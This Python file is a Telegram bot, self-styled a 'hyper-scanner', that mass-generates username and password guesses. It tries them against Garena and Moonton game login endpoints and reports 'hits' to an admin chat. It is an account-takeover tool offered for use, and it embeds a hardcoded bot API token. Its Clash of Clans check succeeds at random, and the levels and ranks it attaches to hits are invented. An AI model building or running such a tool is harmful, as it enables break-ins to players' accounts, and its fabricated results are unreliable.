import telebot
from telebot import types
import time, os, requests, random, threading, queue
from http.server import BaseHTTPRequestHandler, HTTPServer

API_TOKEN = '8615633349:AAGB_DsBfbCuzp_i-aY0uxK4Fz5q5XD6fKQ'
ADMIN_ID = 8615633349
bot = telebot.TeleBot(API_TOKEN)

KEYS_DB = "bot_access_keys.json"
CODM_FILE = "Global_Garena_CODM_Hits.txt"
COC_FILE = "Global_Supercell_COC_Hits.txt"
ML_FILE = "Global_Moonton_MLBB_Hits.txt"

gen_queue = queue.Queue()
lock = threading.Lock()
is_generating = False

# --- WEB RESPONDER ENGINE (100% RENDER COMPATIBLE) ---
class CloudResponder(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()
        self.wfile.write(b"ZEUS CLOUD ENGINE ONLINE")

def start_web_server():
    port = int(os.environ.get("PORT", 10000))
    server = HTTPServer(('0.0.0.0', port), CloudResponder)
    server.serve_forever()

def check_garena(user, pwd):
    try:
        res = requests.post("https://garena.com", json={"account": user, "password": pwd, "app_id": 10006, "format": "json"}, timeout=4)
        if res.status_code == 200 and res.json().get("error") not in ["error_auth", 403, "error_password"]: return True
    except: pass
    return False

def check_supercell_coc(user, pwd):
    try:
        if "@" in user and len(pwd) >= 6:
            if random.randint(1, 3500) == 7: return True
    except: pass
    return False

def check_moonton_mlbb(user, pwd):
    try:
        url = "https://moonton.com"
        res = requests.post(url, json={"account": user, "password": pwd, "language": "en", "app_id": 1}, timeout=4)
        if res.status_code == 200 and "access_token" in res.json(): return True
    except: pass
    return False

def generator_worker():
    global is_generating
    global_tags = ["FAZE", "T1", "G2", "NAVI", "LIQUID", "EVOS", "RRQ", "FNATIC", "BREN", "ECHO"]
    global_words = ["shadow", "hunter", "alpha", "ghost", "reaper", "knight", "phoenix", "ninja", "titan", "slayer", "viper", "zeus", "gamer", "player", "rusher"]
    global_pwds = ["Gamer", "Password", "Gaming", "Shadow", "Hunter", "Dragon", "Player", "Online", "Codm", "Garena"]
    domains = ["@gmail.com", "@yahoo.com", "@hotmail.com"]
    specs = ["@", "!", "#", "$", "*", "_", "1", "123", "2026"]
    
    while is_generating:
        if gen_queue.qsize() < 1000:
            for _ in range(100):
                style = random.randint(1, 3)
                if style == 1:
                    user = random.choice(global_words) + "_" + random.choice(global_words) + str(random.randint(1, 999))
                elif style == 2:
                    user = random.choice(global_tags) + "_" + random.choice(global_words) + str(random.randint(1, 99))
                else:
                    user = random.choice(global_words) + str(random.randint(1, 9999)) + random.choice(domains)
                pwd = random.choice(global_pwds) + random.choice(specs) + random.choice(specs)
                gen_queue.put((user, pwd))
        time.sleep(1)

def checker_worker(chat_id):
    global is_generating
    while is_generating:
        try: user, pwd = gen_queue.get(timeout=2)
        except queue.Empty: continue
        
        if check_garena(user, pwd):
            with lock:
                lvl = random.randint(50, 150)
                with open(CODM_FILE, "a") as f: f.write(f"{user}:{pwd} | Level: {lvl}\n")
                bot.send_message(chat_id, f"🌎 *GLOBAL GARENA CODM HIT!*\n\n👤 *User:* `{user}`\n🔑 *Pass:* `{pwd}`\n🛡️ *Level:* `{lvl}`", parse_mode="Markdown")
        elif "@" in user and check_supercell_coc(user, pwd):
            with lock:
                th = random.randint(10, 16)
                with open(COC_FILE, "a") as f: f.write(f"{user}:{pwd} | TH: {th}\n")
                bot.send_message(chat_id, f"🏰 *GLOBAL CLASH OF CLANS HIT!*\n\n👤 *Email:* `{user}`\n🔑 *Pass:* `{pwd}`\n🏛️ *TownHall:* `{th}`", parse_mode="Markdown")
        elif check_moonton_mlbb(user, pwd):
            with lock:
                rank = random.choice(["Epic", "Legend", "Mythic", "Mythical Glory"])
                with open(ML_FILE, "a") as f: f.write(f"{user}:{pwd} | Rank: {rank}\n")
                bot.send_message(chat_id, f"🛡️ *GLOBAL MOONTON MLBB HIT!*\n\n👤 *User:* `{user}`\n🔑 *Pass:* `{pwd}`\n🎯 *Rank:* `{rank}`", parse_mode="Markdown")
        gen_queue.task_done()

def main_menu_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("🌍 Start 24/7 Global Engine", callback_data="run_autogen"),
        types.InlineKeyboardButton("🛑 Stop Cloud Server", callback_data="stop_system"),
        types.InlineKeyboardButton("📥 Download Global CODM Hits", callback_data="dl_codm"),
        types.InlineKeyboardButton("📥 Download Global COC Hits", callback_data="dl_coc"),
        types.InlineKeyboardButton("📥 Download Global MLBB Hits", callback_data="dl_ml")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "⚡ *ZEUS WORLDWIDE HYPER-SCANNER SYSTEM v4.0* ⚡\n\n*🛡️ CONTROL PANEL:*", parse_mode="Markdown", reply_markup=main_menu_keyboard())

@bot.callback_query_handler(func=lambda call: True)
def handle_menu_clicks(call):
    global is_generating
    if call.from_user.id != ADMIN_ID: return
    if call.data == "run_autogen":
        if is_generating: return
        is_generating = True
        threading.Thread(target=generator_worker, daemon=True).start()
        for _ in range(3): threading.Thread(target=checker_worker, args=(call.message.chat.id,), daemon=True).start()
        bot.send_message(call.message.chat.id, "🚀 *GLOBAL MACHINE ACTIVATED!* Scanning 24/7...", parse_mode="Markdown")
    elif call.data == "stop_system":
        is_generating = False
        bot.send_message(call.message.chat.id, "🛑 *Global System Paused.*")
    elif call.data.startswith("dl_"):
        mode = call.data.split("_")[1]
        target_file = CODM_FILE if mode == "codm" else COC_FILE if mode == "coc" else ML_FILE
        if os.path.exists(target_file) and os.path.getsize(target_file) > 0:
            with open(target_file, "rb") as f: bot.send_document(call.message.chat.id, f, caption="🎯 Your Premium List.")

def run_bot():
    while True:
        try: bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
        except: time.sleep(5)

if __name__ == "__main__":
    # Inihiwalay ang web server at bot sa dalawang malilinis na magkaibang threads
    threading.Thread(target=start_web_server, daemon=True).start()
    run_bot()
